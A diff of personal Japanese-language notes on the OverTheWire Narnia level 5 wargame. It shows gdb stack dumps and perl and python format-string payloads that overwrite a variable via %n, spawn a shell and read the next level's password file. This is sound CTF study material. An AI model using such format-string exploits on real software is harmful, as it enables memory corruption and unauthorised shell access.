@@ -3,11 +3,14 @@ faimahchiy
 
 ローカル変数のiを500(0x1f4)にできれば終わり
 
+```sh
 ~/ctf/OverTheWire/Narnia/level5:yyy@[master](*｡˃̵ω ˂̵｡) < ./narnia5 AAAAA,%p,%p,%p,%p,%p,%p,%p                                                                                               [master]
 Change i's value from 1 -> 500. No way...let me give you a hint!
 buffer : [AAAAA,0xfec7,0xffffffff,0x2f,0xf7e05dc8,0x41414141,0x78302c41,0] (63)
 i = 1 (0xffffbf7c)
+```
 
+```
 gdb-peda$ x/10wx 0xffffbf3c 0xffffbf3c: 0x00000001 
 gdb-peda$ x/100wx $esp
 0xffffbed0: 0xffffbeec  0x00000040  0xffffc282  0x0000fec7
@@ -35,7 +38,9 @@ gdb-peda$ x/100wx $esp
 0xffffc030: 0xffffc537  0xffffc55e  0xffffc587  0xffffc5a8
 0xffffc040: 0xffffc5c3  0xffffc5d5  0xffffc5f5  0xffffc608
 0xffffc050: 0xffffc642  0xffffc686  0xffffc6bc  0xffffc700
+```
 
+```
 gdb-peda$ x/100wx $esp
 0xffffbed0: 0xffffbeec  0x00000040  0xffffc282  0x0000fec7
 0xffffbee0: 0xffffffff  0x0000002f  0xf7e05dc8  0x41414141 <- AAA....
@@ -62,41 +67,49 @@ gdb-peda$ x/100wx $esp
 0xffffc030: 0xffffc537  0xffffc55e  0xffffc587  0xffffc5a8
 0xffffc040: 0xffffc5c3  0xffffc5d5  0xffffc5f5  0xffffc608
 0xffffc050: 0xffffc642  0xffffc686  0xffffc6bc  0xffffc700
+```
 
 
 どうやってもiの値が変わんないと思ったら、解答通りやったとしてもなぜかSEVGしてできない
 
 perlだと上手く行く？？？
 
+```sh
 ~/ctf/OverTheWire/Narnia/level5:yyy@[master](*｡˃̵ω ˂̵｡) < ./narnia5 `perl -e 'print "\x8c\xbf\xff\xff" . "%x%x%x%.481d%n"'`                                                                  [master]
 Change i's value from 1 -> 500. GOOD
 $ exit
 No way...let me give you a hint!
 buffer : [����fec7ffffffff2f-00000000000000000000000000000000000000000000] (63)
 i = 500 (0xffffbf8c)
+```
 
 
 pythonでもできた
 
+```sh
 ~/ctf/OverTheWire/Narnia/level5:yyy@[master](*｡˃̵ω ˂̵｡) < ./narnia5 $(python -c 'print "\x8c\xbf\xff\xff" + "%x%x%x%482d%n"')                                                                [master]
 Change i's value from 1 -> 500. GOOD
 $ exit
 No way...let me give you a hint!
 buffer : [����fec7ffffffff2f                                             ] (63)
 i = 500 (0xffffbf8c)
+```
 
 
+```sh
 ~/ctf/OverTheWire/Narnia/level5:yyy@[master](*｡˃̵ω ˂̵｡) < ./narnia5 $(python -c 'print "\x8c\xbf\xff\xff" + "%x%x%x%482x%n"')                                                                [master]
 Change i's value from 1 -> 500. GOOD
 $ exit
 No way...let me give you a hint!
 buffer : [����fec7ffffffff2f                                             ] (63)
 i = 500 (0xffffbf8c)
+```
 
 
 何が問題？？？
 
 
+```sh
 narnia5@narnia:~$ /narnia/narnia5 `perl -e 'print "\x1c\xd7\xff\xff" . "%x%x%x%.471d%n"'`
 Change i's value from 1 -> 500. GOOD
 $ cat /etc/narnia_pass/narnia6
@@ -105,3 +118,4 @@ $ exit
 No way...let me give you a hint!
 buffer : [���f7eb8fe6ffffffffffffd6fe-0000000000000000000000000000000000] (63)
 i = 500 (0xffffd71c)
+```
